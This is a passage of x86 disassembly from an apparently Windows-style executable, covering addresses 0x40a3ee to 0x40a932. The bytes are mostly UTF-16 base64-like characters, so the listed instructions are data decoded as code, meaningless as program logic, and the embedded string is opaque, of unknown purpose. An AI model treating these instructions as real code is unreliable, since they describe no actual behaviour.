  40a3ee:	00 56 00             	add    %dl,0x0(%esi)
  40a3f1:	5a                   	pop    %edx
  40a3f2:	00 41 00             	add    %al,0x0(%ecx)
  40a3f5:	2f                   	das
  40a3f6:	00 5a 00             	add    %bl,0x0(%edx)
  40a3f9:	63 00                	arpl   %eax,(%eax)
  40a3fb:	38 00                	cmp    %al,(%eax)
  40a3fd:	44                   	inc    %esp
  40a3fe:	00 30                	add    %dh,(%eax)
  40a400:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a404:	00 66 00             	add    %ah,0x0(%esi)
  40a407:	35 00 56 00 31       	xor    $0x31005600,%eax
  40a40c:	00 31                	add    %dh,(%ecx)
  40a40e:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  40a412:	00 79 00             	add    %bh,0x0(%ecx)
  40a415:	50                   	push   %eax
  40a416:	00 57 00             	add    %dl,0x0(%edi)
  40a419:	4b                   	dec    %ebx
  40a41a:	00 49 00             	add    %cl,0x0(%ecx)
  40a41d:	79 00                	jns    0x40a41f
  40a41f:	2f                   	das
  40a420:	00 7a 00             	add    %bh,0x0(%edx)
  40a423:	58                   	pop    %eax
  40a424:	00 43 00             	add    %al,0x0(%ebx)
  40a427:	56                   	push   %esi
  40a428:	00 68 00             	add    %ch,0x0(%eax)
  40a42b:	6c                   	insb   (%dx),%es:(%edi)
  40a42c:	00 6f 00             	add    %ch,0x0(%edi)
  40a42f:	74 00                	je     0x40a431
  40a431:	6e                   	outsb  %ds:(%esi),(%dx)
  40a432:	00 68 00             	add    %ch,0x0(%eax)
  40a435:	38 00                	cmp    %al,(%eax)
  40a437:	5a                   	pop    %edx
  40a438:	00 59 00             	add    %bl,0x0(%ecx)
  40a43b:	42                   	inc    %edx
  40a43c:	00 72 00             	add    %dh,0x0(%edx)
  40a43f:	2f                   	das
  40a440:	00 58 00             	add    %bl,0x0(%eax)
  40a443:	31 00                	xor    %eax,(%eax)
  40a445:	58                   	pop    %eax
  40a446:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40a44a:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40a44e:	00 5a 00             	add    %bl,0x0(%edx)
  40a451:	47                   	inc    %edi
  40a452:	00 37                	add    %dh,(%edi)
  40a454:	00 38                	add    %bh,(%eax)
  40a456:	00 69 00             	add    %ch,0x0(%ecx)
  40a459:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a45c:	00 4d 00             	add    %cl,0x0(%ebp)
  40a45f:	53                   	push   %ebx
  40a460:	00 4b 00             	add    %cl,0x0(%ebx)
  40a463:	30 00                	xor    %al,(%eax)
  40a465:	45                   	inc    %ebp
  40a466:	00 65 00             	add    %ah,0x0(%ebp)
  40a469:	35 00 45 00 54       	xor    $0x54004500,%eax
  40a46e:	00 4b 00             	add    %cl,0x0(%ebx)
  40a471:	76 00                	jbe    0x40a473
  40a473:	4b                   	dec    %ebx
  40a474:	00 56 00             	add    %dl,0x0(%esi)
  40a477:	2b 00                	sub    (%eax),%eax
  40a479:	51                   	push   %ecx
  40a47a:	00 6b 00             	add    %ch,0x0(%ebx)
  40a47d:	77 00                	ja     0x40a47f
  40a47f:	4f                   	dec    %edi
  40a480:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40a484:	00 38                	add    %bh,(%eax)
  40a486:	00 7a 00             	add    %bh,0x0(%edx)
  40a489:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a48d:	56                   	push   %esi
  40a48e:	00 47 00             	add    %al,0x0(%edi)
  40a491:	54                   	push   %esp
  40a492:	00 67 00             	add    %ah,0x0(%edi)
  40a495:	32 00                	xor    (%eax),%al
  40a497:	54                   	push   %esp
  40a498:	00 61 00             	add    %ah,0x0(%ecx)
  40a49b:	70 00                	jo     0x40a49d
  40a49d:	7a 00                	jp     0x40a49f
  40a49f:	75 00                	jne    0x40a4a1
  40a4a1:	4d                   	dec    %ebp
  40a4a2:	00 78 00             	add    %bh,0x0(%eax)
  40a4a5:	39 00                	cmp    %eax,(%eax)
  40a4a7:	47                   	inc    %edi
  40a4a8:	00 58 00             	add    %bl,0x0(%eax)
  40a4ab:	32 00                	xor    (%eax),%al
  40a4ad:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a4b0:	00 77 00             	add    %dh,0x0(%edi)
  40a4b3:	52                   	push   %edx
  40a4b4:	00 55 00             	add    %dl,0x0(%ebp)
  40a4b7:	38 00                	cmp    %al,(%eax)
  40a4b9:	70 00                	jo     0x40a4bb
  40a4bb:	69 00 76 00 6d 00    	imul   $0x6d0076,(%eax),%eax
  40a4c1:	54                   	push   %esp
  40a4c2:	00 49 00             	add    %cl,0x0(%ecx)
  40a4c5:	4d                   	dec    %ebp
  40a4c6:	00 51 00             	add    %dl,0x0(%ecx)
  40a4c9:	5a                   	pop    %edx
  40a4ca:	00 53 00             	add    %dl,0x0(%ebx)
  40a4cd:	70 00                	jo     0x40a4cf
  40a4cf:	47                   	inc    %edi
  40a4d0:	00 4a 00             	add    %cl,0x0(%edx)
  40a4d3:	41                   	inc    %ecx
  40a4d4:	00 33                	add    %dh,(%ebx)
  40a4d6:	00 33                	add    %dh,(%ebx)
  40a4d8:	00 62 00             	add    %ah,0x0(%edx)
  40a4db:	4c                   	dec    %esp
  40a4dc:	00 6a 00             	add    %ch,0x0(%edx)
  40a4df:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40a4e3:	6d                   	insl   (%dx),%es:(%edi)
  40a4e4:	00 6b 00             	add    %ch,0x0(%ebx)
  40a4e7:	62 00                	bound  %eax,(%eax)
  40a4e9:	34 00                	xor    $0x0,%al
  40a4eb:	35 00 76 00 67       	xor    $0x67007600,%eax
  40a4f0:	00 62 00             	add    %ah,0x0(%edx)
  40a4f3:	75 00                	jne    0x40a4f5
  40a4f5:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4f6:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  40a4fa:	00 47 00             	add    %al,0x0(%edi)
  40a4fd:	2b 00                	sub    (%eax),%eax
  40a4ff:	52                   	push   %edx
  40a500:	00 7a 00             	add    %bh,0x0(%edx)
  40a503:	2b 00                	sub    (%eax),%eax
  40a505:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a508:	00 50 00             	add    %dl,0x0(%eax)
  40a50b:	56                   	push   %esi
  40a50c:	00 69 00             	add    %ch,0x0(%ecx)
  40a50f:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40a512:	00 46 00             	add    %al,0x0(%esi)
  40a515:	38 00                	cmp    %al,(%eax)
  40a517:	55                   	push   %ebp
  40a518:	00 51 00             	add    %dl,0x0(%ecx)
  40a51b:	58                   	pop    %eax
  40a51c:	00 7a 00             	add    %bh,0x0(%edx)
  40a51f:	53                   	push   %ebx
  40a520:	00 4d 00             	add    %cl,0x0(%ebp)
  40a523:	44                   	inc    %esp
  40a524:	00 72 00             	add    %dh,0x0(%edx)
  40a527:	4a                   	dec    %edx
  40a528:	00 48 00             	add    %cl,0x0(%eax)
  40a52b:	50                   	push   %eax
  40a52c:	00 32                	add    %dh,(%edx)
  40a52e:	00 71 00             	add    %dh,0x0(%ecx)
  40a531:	38 00                	cmp    %al,(%eax)
  40a533:	42                   	inc    %edx
  40a534:	00 48 00             	add    %cl,0x0(%eax)
  40a537:	43                   	inc    %ebx
  40a538:	00 48 00             	add    %cl,0x0(%eax)
  40a53b:	32 00                	xor    (%eax),%al
  40a53d:	33 00                	xor    (%eax),%eax
  40a53f:	39 00                	cmp    %eax,(%eax)
  40a541:	4b                   	dec    %ebx
  40a542:	00 75 00             	add    %dh,0x0(%ebp)
  40a545:	33 00                	xor    (%eax),%eax
  40a547:	72 00                	jb     0x40a549
  40a549:	56                   	push   %esi
  40a54a:	00 30                	add    %dh,(%eax)
  40a54c:	00 78 00             	add    %bh,0x0(%eax)
  40a54f:	71 00                	jno    0x40a551
  40a551:	42                   	inc    %edx
  40a552:	00 35 00 52 00 70    	add    %dh,0x70005200
  40a558:	00 6b 00             	add    %ch,0x0(%ebx)
  40a55b:	63 00                	arpl   %eax,(%eax)
  40a55d:	41                   	inc    %ecx
  40a55e:	00 73 00             	add    %dh,0x0(%ebx)
  40a561:	50                   	push   %eax
  40a562:	00 46 00             	add    %al,0x0(%esi)
  40a565:	41                   	inc    %ecx
  40a566:	00 4d 00             	add    %cl,0x0(%ebp)
  40a569:	77 00                	ja     0x40a56b
  40a56b:	59                   	pop    %ecx
  40a56c:	00 57 00             	add    %dl,0x0(%edi)
  40a56f:	61                   	popa
  40a570:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40a574:	00 36                	add    %dh,(%esi)
  40a576:	00 49 00             	add    %cl,0x0(%ecx)
  40a579:	56                   	push   %esi
  40a57a:	00 59 00             	add    %bl,0x0(%ecx)
  40a57d:	75 00                	jne    0x40a57f
  40a57f:	7a 00                	jp     0x40a581
  40a581:	4a                   	dec    %edx
  40a582:	00 2f                	add    %ch,(%edi)
  40a584:	00 30                	add    %dh,(%eax)
  40a586:	00 6e 00             	add    %ch,0x0(%esi)
  40a589:	4c                   	dec    %esp
  40a58a:	00 49 00             	add    %cl,0x0(%ecx)
  40a58d:	33 00                	xor    (%eax),%eax
  40a58f:	6a 00                	push   $0x0
  40a591:	4d                   	dec    %ebp
  40a592:	00 68 00             	add    %ch,0x0(%eax)
  40a595:	68 00 75 00 48       	push   $0x48007500
  40a59a:	00 52 00             	add    %dl,0x0(%edx)
  40a59d:	2f                   	das
  40a59e:	00 6f 00             	add    %ch,0x0(%edi)
  40a5a1:	65 00 54 00 63       	add    %dl,%gs:0x63(%eax,%eax,1)
  40a5a6:	00 6e 00             	add    %ch,0x0(%esi)
  40a5a9:	4a                   	dec    %edx
  40a5aa:	00 72 00             	add    %dh,0x0(%edx)
  40a5ad:	65 00 64 00 43       	add    %ah,%gs:0x43(%eax,%eax,1)
  40a5b2:	00 36                	add    %dh,(%esi)
  40a5b4:	00 73 00             	add    %dh,0x0(%ebx)
  40a5b7:	72 00                	jb     0x40a5b9
  40a5b9:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40a5bd:	67 00 35             	add    %dh,(%di)
  40a5c0:	00 78 00             	add    %bh,0x0(%eax)
  40a5c3:	44                   	inc    %esp
  40a5c4:	00 50 00             	add    %dl,0x0(%eax)
  40a5c7:	48                   	dec    %eax
  40a5c8:	00 49 00             	add    %cl,0x0(%ecx)
  40a5cb:	59                   	pop    %ecx
  40a5cc:	00 31                	add    %dh,(%ecx)
  40a5ce:	00 76 00             	add    %dh,0x0(%esi)
  40a5d1:	6c                   	insb   (%dx),%es:(%edi)
  40a5d2:	00 68 00             	add    %ch,0x0(%eax)
  40a5d5:	35 00 64 00 37       	xor    $0x37006400,%eax
  40a5da:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5dd:	5a                   	pop    %edx
  40a5de:	00 45 00             	add    %al,0x0(%ebp)
  40a5e1:	63 00                	arpl   %eax,(%eax)
  40a5e3:	66 00 39             	data16 add %bh,(%ecx)
  40a5e6:	00 61 00             	add    %ah,0x0(%ecx)
  40a5e9:	41                   	inc    %ecx
  40a5ea:	00 56 00             	add    %dl,0x0(%esi)
  40a5ed:	4e                   	dec    %esi
  40a5ee:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5f1:	70 00                	jo     0x40a5f3
  40a5f3:	4f                   	dec    %edi
  40a5f4:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a5f8:	00 30                	add    %dh,(%eax)
  40a5fa:	00 48 00             	add    %cl,0x0(%eax)
  40a5fd:	45                   	inc    %ebp
  40a5fe:	00 4f 00             	add    %cl,0x0(%edi)
  40a601:	64 00 35 00 56 00 47 	add    %dh,%fs:0x47005600
  40a608:	00 56 00             	add    %dl,0x0(%esi)
  40a60b:	78 00                	js     0x40a60d
  40a60d:	30 00                	xor    %al,(%eax)
  40a60f:	56                   	push   %esi
  40a610:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40a614:	00 59 00             	add    %bl,0x0(%ecx)
  40a617:	76 00                	jbe    0x40a619
  40a619:	5a                   	pop    %edx
  40a61a:	00 35 00 64 00 73    	add    %dh,0x73006400
  40a620:	00 30                	add    %dh,(%eax)
  40a622:	00 36                	add    %dh,(%esi)
  40a624:	00 63 00             	add    %ah,0x0(%ebx)
  40a627:	52                   	push   %edx
  40a628:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40a62c:	00 2f                	add    %ch,(%edi)
  40a62e:	00 7a 00             	add    %bh,0x0(%edx)
  40a631:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40a635:	2f                   	das
  40a636:	00 70 00             	add    %dh,0x0(%eax)
  40a639:	7a 00                	jp     0x40a63b
  40a63b:	6a 00                	push   $0x0
  40a63d:	44                   	inc    %esp
  40a63e:	00 72 00             	add    %dh,0x0(%edx)
  40a641:	4e                   	dec    %esi
  40a642:	00 31                	add    %dh,(%ecx)
  40a644:	00 46 00             	add    %al,0x0(%esi)
  40a647:	47                   	inc    %edi
  40a648:	00 58 00             	add    %bl,0x0(%eax)
  40a64b:	35 00 31 00 4f       	xor    $0x4f003100,%eax
  40a650:	00 4f 00             	add    %cl,0x0(%edi)
  40a653:	2f                   	das
  40a654:	00 36                	add    %dh,(%esi)
  40a656:	00 66 00             	add    %ah,0x0(%esi)
  40a659:	4a                   	dec    %edx
  40a65a:	00 2b                	add    %ch,(%ebx)
  40a65c:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
  40a660:	00 43 00             	add    %al,0x0(%ebx)
  40a663:	42                   	inc    %edx
  40a664:	00 39                	add    %bh,(%ecx)
  40a666:	00 79 00             	add    %bh,0x0(%ecx)
  40a669:	6e                   	outsb  %ds:(%esi),(%dx)
  40a66a:	00 46 00             	add    %al,0x0(%esi)
  40a66d:	30 00                	xor    %al,(%eax)
  40a66f:	4b                   	dec    %ebx
  40a670:	00 42 00             	add    %al,0x0(%edx)
  40a673:	4e                   	dec    %esi
  40a674:	00 77 00             	add    %dh,0x0(%edi)
  40a677:	6d                   	insl   (%dx),%es:(%edi)
  40a678:	00 4b 00             	add    %cl,0x0(%ebx)
  40a67b:	51                   	push   %ecx
  40a67c:	00 4f 00             	add    %cl,0x0(%edi)
  40a67f:	2f                   	das
  40a680:	00 2b                	add    %ch,(%ebx)
  40a682:	00 57 00             	add    %dl,0x0(%edi)
  40a685:	68 00 50 00 72       	push   $0x72005000
  40a68a:	00 36                	add    %dh,(%esi)
  40a68c:	00 55 00             	add    %dl,0x0(%ebp)
  40a68f:	44                   	inc    %esp
  40a690:	00 53 00             	add    %dl,0x0(%ebx)
  40a693:	77 00                	ja     0x40a695
  40a695:	6f                   	outsl  %ds:(%esi),(%dx)
  40a696:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40a69a:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40a69e:	00 78 00             	add    %bh,0x0(%eax)
  40a6a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6a2:	00 50 00             	add    %dl,0x0(%eax)
  40a6a5:	54                   	push   %esp
  40a6a6:	00 2f                	add    %ch,(%edi)
  40a6a8:	00 66 00             	add    %ah,0x0(%esi)
  40a6ab:	46                   	inc    %esi
  40a6ac:	00 72 00             	add    %dh,0x0(%edx)
  40a6af:	34 00                	xor    $0x0,%al
  40a6b1:	71 00                	jno    0x40a6b3
  40a6b3:	30 00                	xor    %al,(%eax)
  40a6b5:	30 00                	xor    %al,(%eax)
  40a6b7:	51                   	push   %ecx
  40a6b8:	00 61 00             	add    %ah,0x0(%ecx)
  40a6bb:	45                   	inc    %ebp
  40a6bc:	00 67 00             	add    %ah,0x0(%edi)
  40a6bf:	79 00                	jns    0x40a6c1
  40a6c1:	5a                   	pop    %edx
  40a6c2:	00 69 00             	add    %ch,0x0(%ecx)
  40a6c5:	61                   	popa
  40a6c6:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40a6ca:	00 41 00             	add    %al,0x0(%ecx)
  40a6cd:	4d                   	dec    %ebp
  40a6ce:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6d1:	4c                   	dec    %esp
  40a6d2:	00 7a 00             	add    %bh,0x0(%edx)
  40a6d5:	34 00                	xor    $0x0,%al
  40a6d7:	35 00 51 00 51       	xor    $0x51005100,%eax
  40a6dc:	00 65 00             	add    %ah,0x0(%ebp)
  40a6df:	6a 00                	push   $0x0
  40a6e1:	51                   	push   %ecx
  40a6e2:	00 50 00             	add    %dl,0x0(%eax)
  40a6e5:	68 00 43 00 2f       	push   $0x2f004300
  40a6ea:	00 6e 00             	add    %ch,0x0(%esi)
  40a6ed:	41                   	inc    %ecx
  40a6ee:	00 50 00             	add    %dl,0x0(%eax)
  40a6f1:	63 00                	arpl   %eax,(%eax)
  40a6f3:	4a                   	dec    %edx
  40a6f4:	00 35 00 4a 00 49    	add    %dh,0x49004a00
  40a6fa:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6fd:	69 00 65 00 2f 00    	imul   $0x2f0065,(%eax),%eax
  40a703:	51                   	push   %ecx
  40a704:	00 73 00             	add    %dh,0x0(%ebx)
  40a707:	54                   	push   %esp
  40a708:	00 57 00             	add    %dl,0x0(%edi)
  40a70b:	30 00                	xor    %al,(%eax)
  40a70d:	38 00                	cmp    %al,(%eax)
  40a70f:	2b 00                	sub    (%eax),%eax
  40a711:	66 00 32             	data16 add %dh,(%edx)
  40a714:	00 48 00             	add    %cl,0x0(%eax)
  40a717:	6d                   	insl   (%dx),%es:(%edi)
  40a718:	00 59 00             	add    %bl,0x0(%ecx)
  40a71b:	50                   	push   %eax
  40a71c:	00 5a 00             	add    %bl,0x0(%edx)
  40a71f:	73 00                	jae    0x40a721
  40a721:	49                   	dec    %ecx
  40a722:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40a726:	00 35 00 4a 00 4c    	add    %dh,0x4c004a00
  40a72c:	00 50 00             	add    %dl,0x0(%eax)
  40a72f:	54                   	push   %esp
  40a730:	00 41 00             	add    %al,0x0(%ecx)
  40a733:	6f                   	outsl  %ds:(%esi),(%dx)
  40a734:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a737:	55                   	push   %ebp
  40a738:	00 46 00             	add    %al,0x0(%esi)
  40a73b:	34 00                	xor    $0x0,%al
  40a73d:	53                   	push   %ebx
  40a73e:	00 5a 00             	add    %bl,0x0(%edx)
  40a741:	46                   	inc    %esi
  40a742:	00 61 00             	add    %ah,0x0(%ecx)
  40a745:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a749:	32 00                	xor    (%eax),%al
  40a74b:	75 00                	jne    0x40a74d
  40a74d:	61                   	popa
  40a74e:	00 4d 00             	add    %cl,0x0(%ebp)
  40a751:	52                   	push   %edx
  40a752:	00 39                	add    %bh,(%ecx)
  40a754:	00 4a 00             	add    %cl,0x0(%edx)
  40a757:	76 00                	jbe    0x40a759
  40a759:	56                   	push   %esi
  40a75a:	00 62 00             	add    %ah,0x0(%edx)
  40a75d:	4b                   	dec    %ebx
  40a75e:	00 78 00             	add    %bh,0x0(%eax)
  40a761:	35 00 53 00 44       	xor    $0x44005300,%eax
  40a766:	00 32                	add    %dh,(%edx)
  40a768:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40a76c:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  40a770:	00 41 00             	add    %al,0x0(%ecx)
  40a773:	4b                   	dec    %ebx
  40a774:	00 59 00             	add    %bl,0x0(%ecx)
  40a777:	4f                   	dec    %edi
  40a778:	00 46 00             	add    %al,0x0(%esi)
  40a77b:	41                   	inc    %ecx
  40a77c:	00 37                	add    %dh,(%edi)
  40a77e:	00 41 00             	add    %al,0x0(%ecx)
  40a781:	6c                   	insb   (%dx),%es:(%edi)
  40a782:	00 30                	add    %dh,(%eax)
  40a784:	00 4d 00             	add    %cl,0x0(%ebp)
  40a787:	38 00                	cmp    %al,(%eax)
  40a789:	6d                   	insl   (%dx),%es:(%edi)
  40a78a:	00 4b 00             	add    %cl,0x0(%ebx)
  40a78d:	59                   	pop    %ecx
  40a78e:	00 4a 00             	add    %cl,0x0(%edx)
  40a791:	56                   	push   %esi
  40a792:	00 39                	add    %bh,(%ecx)
  40a794:	00 6b 00             	add    %ch,0x0(%ebx)
  40a797:	2b 00                	sub    (%eax),%eax
  40a799:	2f                   	das
  40a79a:	00 6e 00             	add    %ch,0x0(%esi)
  40a79d:	6c                   	insb   (%dx),%es:(%edi)
  40a79e:	00 47 00             	add    %al,0x0(%edi)
  40a7a1:	2f                   	das
  40a7a2:	00 2f                	add    %ch,(%edi)
  40a7a4:	00 71 00             	add    %dh,0x0(%ecx)
  40a7a7:	45                   	inc    %ebp
  40a7a8:	00 69 00             	add    %ch,0x0(%ecx)
  40a7ab:	43                   	inc    %ebx
  40a7ac:	00 5a 00             	add    %bl,0x0(%edx)
  40a7af:	48                   	dec    %eax
  40a7b0:	00 30                	add    %dh,(%eax)
  40a7b2:	00 30                	add    %dh,(%eax)
  40a7b4:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40a7b8:	00 76 00             	add    %dh,0x0(%esi)
  40a7bb:	33 00                	xor    (%eax),%eax
  40a7bd:	36 00 4c 00 46       	add    %cl,%ss:0x46(%eax,%eax,1)
  40a7c2:	00 51 00             	add    %dl,0x0(%ecx)
  40a7c5:	33 00                	xor    (%eax),%eax
  40a7c7:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40a7cb:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7cc:	00 55 00             	add    %dl,0x0(%ebp)
  40a7cf:	50                   	push   %eax
  40a7d0:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7d3:	46                   	inc    %esi
  40a7d4:	00 71 00             	add    %dh,0x0(%ecx)
  40a7d7:	2f                   	das
  40a7d8:	00 79 00             	add    %bh,0x0(%ecx)
  40a7db:	72 00                	jb     0x40a7dd
  40a7dd:	6a 00                	push   $0x0
  40a7df:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7e0:	00 78 00             	add    %bh,0x0(%eax)
  40a7e3:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40a7e6:	00 75 00             	add    %dh,0x0(%ebp)
  40a7e9:	75 00                	jne    0x40a7eb
  40a7eb:	71 00                	jno    0x40a7ed
  40a7ed:	5a                   	pop    %edx
  40a7ee:	00 47 00             	add    %al,0x0(%edi)
  40a7f1:	4a                   	dec    %edx
  40a7f2:	00 56 00             	add    %dl,0x0(%esi)
  40a7f5:	47                   	inc    %edi
  40a7f6:	00 61 00             	add    %ah,0x0(%ecx)
  40a7f9:	61                   	popa
  40a7fa:	00 71 00             	add    %dh,0x0(%ecx)
  40a7fd:	39 00                	cmp    %eax,(%eax)
  40a7ff:	63 00                	arpl   %eax,(%eax)
  40a801:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40a805:	58                   	pop    %eax
  40a806:	00 48 00             	add    %cl,0x0(%eax)
  40a809:	52                   	push   %edx
  40a80a:	00 50 00             	add    %dl,0x0(%eax)
  40a80d:	55                   	push   %ebp
  40a80e:	00 75 00             	add    %dh,0x0(%ebp)
  40a811:	71 00                	jno    0x40a813
  40a813:	52                   	push   %edx
  40a814:	00 75 00             	add    %dh,0x0(%ebp)
  40a817:	4b                   	dec    %ebx
  40a818:	00 52 00             	add    %dl,0x0(%edx)
  40a81b:	75 00                	jne    0x40a81d
  40a81d:	4a                   	dec    %edx
  40a81e:	00 47 00             	add    %al,0x0(%edi)
  40a821:	56                   	push   %esi
  40a822:	00 31                	add    %dh,(%ecx)
  40a824:	00 33                	add    %dh,(%ebx)
  40a826:	00 7a 00             	add    %bh,0x0(%edx)
  40a829:	37                   	aaa
  40a82a:	00 4f 00             	add    %cl,0x0(%edi)
  40a82d:	30 00                	xor    %al,(%eax)
  40a82f:	41                   	inc    %ecx
  40a830:	00 32                	add    %dh,(%edx)
  40a832:	00 75 00             	add    %dh,0x0(%ebp)
  40a835:	76 00                	jbe    0x40a837
  40a837:	4c                   	dec    %esp
  40a838:	00 50 00             	add    %dl,0x0(%eax)
  40a83b:	63 00                	arpl   %eax,(%eax)
  40a83d:	4f                   	dec    %edi
  40a83e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a841:	78 00                	js     0x40a843
  40a843:	65 00 6c 00 63       	add    %ch,%gs:0x63(%eax,%eax,1)
  40a848:	00 47 00             	add    %al,0x0(%edi)
  40a84b:	43                   	inc    %ebx
  40a84c:	00 73 00             	add    %dh,0x0(%ebx)
  40a84f:	4a                   	dec    %edx
  40a850:	00 33                	add    %dh,(%ebx)
  40a852:	00 78 00             	add    %bh,0x0(%eax)
  40a855:	55                   	push   %ebp
  40a856:	00 41 00             	add    %al,0x0(%ecx)
  40a859:	75 00                	jne    0x40a85b
  40a85b:	2f                   	das
  40a85c:	00 4d 00             	add    %cl,0x0(%ebp)
  40a85f:	55                   	push   %ebp
  40a860:	00 70 00             	add    %dh,0x0(%eax)
  40a863:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a866:	00 56 00             	add    %dl,0x0(%esi)
  40a869:	48                   	dec    %eax
  40a86a:	00 71 00             	add    %dh,0x0(%ecx)
  40a86d:	77 00                	ja     0x40a86f
  40a86f:	4a                   	dec    %edx
  40a870:	00 48 00             	add    %cl,0x0(%eax)
  40a873:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40a877:	47                   	inc    %edi
  40a878:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40a87c:	00 58 00             	add    %bl,0x0(%eax)
  40a87f:	5a                   	pop    %edx
  40a880:	00 33                	add    %dh,(%ebx)
  40a882:	00 75 00             	add    %dh,0x0(%ebp)
  40a885:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40a889:	38 00                	cmp    %al,(%eax)
  40a88b:	41                   	inc    %ecx
  40a88c:	00 67 00             	add    %ah,0x0(%edi)
  40a88f:	33 00                	xor    (%eax),%eax
  40a891:	68 00 30 00 66       	push   $0x66003000
  40a896:	00 55 00             	add    %dl,0x0(%ebp)
  40a899:	49                   	dec    %ecx
  40a89a:	00 43 00             	add    %al,0x0(%ebx)
  40a89d:	4b                   	dec    %ebx
  40a89e:	00 5a 00             	add    %bl,0x0(%edx)
  40a8a1:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40a8a5:	74 00                	je     0x40a8a7
  40a8a7:	55                   	push   %ebp
  40a8a8:	00 42 00             	add    %al,0x0(%edx)
  40a8ab:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40a8af:	38 00                	cmp    %al,(%eax)
  40a8b1:	6b 00 38             	imul   $0x38,(%eax),%eax
  40a8b4:	00 59 00             	add    %bl,0x0(%ecx)
  40a8b7:	49                   	dec    %ecx
  40a8b8:	00 2f                	add    %ch,(%edi)
  40a8ba:	00 37                	add    %dh,(%edi)
  40a8bc:	00 33                	add    %dh,(%ebx)
  40a8be:	00 42 00             	add    %al,0x0(%edx)
  40a8c1:	69 00 77 00 4b 00    	imul   $0x4b0077,(%eax),%eax
  40a8c7:	35 00 31 00 32       	xor    $0x32003100,%eax
  40a8cc:	00 72 00             	add    %dh,0x0(%edx)
  40a8cf:	50                   	push   %eax
  40a8d0:	00 49 00             	add    %cl,0x0(%ecx)
  40a8d3:	48                   	dec    %eax
  40a8d4:	00 76 00             	add    %dh,0x0(%esi)
  40a8d7:	31 00                	xor    %eax,(%eax)
  40a8d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8da:	00 53 00             	add    %dl,0x0(%ebx)
  40a8dd:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8de:	00 65 00             	add    %ah,0x0(%ebp)
  40a8e1:	34 00                	xor    $0x0,%al
  40a8e3:	59                   	pop    %ecx
  40a8e4:	00 76 00             	add    %dh,0x0(%esi)
  40a8e7:	4f                   	dec    %edi
  40a8e8:	00 39                	add    %bh,(%ecx)
  40a8ea:	00 43 00             	add    %al,0x0(%ebx)
  40a8ed:	34 00                	xor    $0x0,%al
  40a8ef:	74 00                	je     0x40a8f1
  40a8f1:	2b 00                	sub    (%eax),%eax
  40a8f3:	73 00                	jae    0x40a8f5
  40a8f5:	4e                   	dec    %esi
  40a8f6:	00 61 00             	add    %ah,0x0(%ecx)
  40a8f9:	4e                   	dec    %esi
  40a8fa:	00 32                	add    %dh,(%edx)
  40a8fc:	00 6a 00             	add    %ch,0x0(%edx)
  40a8ff:	63 00                	arpl   %eax,(%eax)
  40a901:	79 00                	jns    0x40a903
  40a903:	52                   	push   %edx
  40a904:	00 49 00             	add    %cl,0x0(%ecx)
  40a907:	51                   	push   %ecx
  40a908:	00 2f                	add    %ch,(%edi)
  40a90a:	00 36                	add    %dh,(%esi)
  40a90c:	00 51 00             	add    %dl,0x0(%ecx)
  40a90f:	79 00                	jns    0x40a911
  40a911:	6c                   	insb   (%dx),%es:(%edi)
  40a912:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a915:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40a918:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40a91c:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40a920:	00 57 00             	add    %dl,0x0(%edi)
  40a923:	6c                   	insb   (%dx),%es:(%edi)
  40a924:	00 78 00             	add    %bh,0x0(%eax)
  40a927:	48                   	dec    %eax
  40a928:	00 65 00             	add    %ah,0x0(%ebp)
  40a92b:	6c                   	insb   (%dx),%es:(%edi)
  40a92c:	00 63 00             	add    %ah,0x0(%ebx)
  40a92f:	6b 00 39             	imul   $0x39,(%eax),%eax
  40a932:	00 71 00             	add    %dh,0x0(%ecx)
